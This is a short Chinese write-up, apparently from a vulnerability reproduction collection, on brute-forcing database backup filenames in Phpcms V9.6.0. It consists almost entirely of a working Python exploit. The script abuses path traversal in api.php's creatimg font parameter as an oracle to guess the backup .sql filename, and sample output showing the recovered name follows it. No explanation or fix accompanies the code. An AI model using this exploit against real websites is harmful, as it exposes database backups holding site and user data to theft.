<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Phpcms V9.6.0 数据库备份爆破</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>Phpcms V9.6.0</p><h2>三、复现过程</h2><p>#!/usr/bin/env python<br /># coding=utf-8<br />'''/*<br />    * author = Mochazz<br />    * team   = 红日安全团队<br />    * env    = pyton3<br />    *<br />    */<br />'''<br />import requests<br />import itertools<br />characters = "abcdefghjklmnopqrstuvwxyz0123456789_!#"<br />backup_sql = ""<br />payload = "/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/{location}&lt;&lt;"<br />url = "http://www.0-sec.org"<br />flag = 0<br />for num in range(1, 7):<br />    if flag:<br />        break<br />    for pre in itertools.permutations(characters, num):<br />        pre = ''.join(list(pre))<br />        payload = payload.format(location=pre)<br />        r = requests.get(url+payload)<br />        if r.status_code == 200 and "PNG" in r.text:<br />            flag = 1<br />            backup_sql = pre<br />            payload = "/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/{location}&lt;&lt;"<br />            break<br />        else:<br />            payload = "/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/{location}&lt;&lt;"<br />print("[+] 前缀为：", backup_sql)<br />flag = 0<br />for i in range(30):<br />    if flag:<br />        break<br />    for ch in characters:<br />        if ch == characters[-1]:<br />            flag = 1<br />            break<br />        payload = payload.format(location=backup_sql+ch)<br />        r = requests.get(url + payload)<br />        if r.status_code == 200 and "PNG" in r.text:<br />            backup_sql += ch<br />            print("[+] ", backup_sql)<br />            payload = "/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/{location}&lt;&lt;"<br />            break<br />        else:<br />            payload = "/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/{location}&lt;&lt;"<br /><br />print("备份sql文件地址为：", backup_sql+".sql")<br /></p><p>结果为：</p><p>C:\Users\dell\Desktop&gt;python Zxc.py<br />[+] 前缀为： 1<br />[+]  12<br />[+]  123<br />[+]  1231<br />[+]  12312<br />[+]  123123<br />[+]  1231231<br />[+]  12312312<br />[+]  123123123<br />备份sql文件地址为： 123123123.sql</p></body></html>